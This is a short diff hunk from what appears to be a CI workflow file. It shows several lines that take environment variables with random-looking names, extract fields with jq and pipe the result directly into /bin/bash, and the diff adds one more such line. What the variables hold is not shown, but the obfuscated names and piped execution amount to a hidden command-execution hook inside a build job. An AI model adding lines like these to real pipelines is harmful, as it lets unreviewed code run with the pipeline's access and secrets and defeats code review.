@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$tlea40186" | jq -r .f601 | /bin/bash
           printf '%s' "$txgng8891" | jq -r .nog633 | /bin/bash
           printf '%s' "$gv5" | jq -r .uglg962 | /bin/bash
+          echo $vhuy8 | jq -r .x580 | /bin/bash
 
       - name: Store results
         if: always()
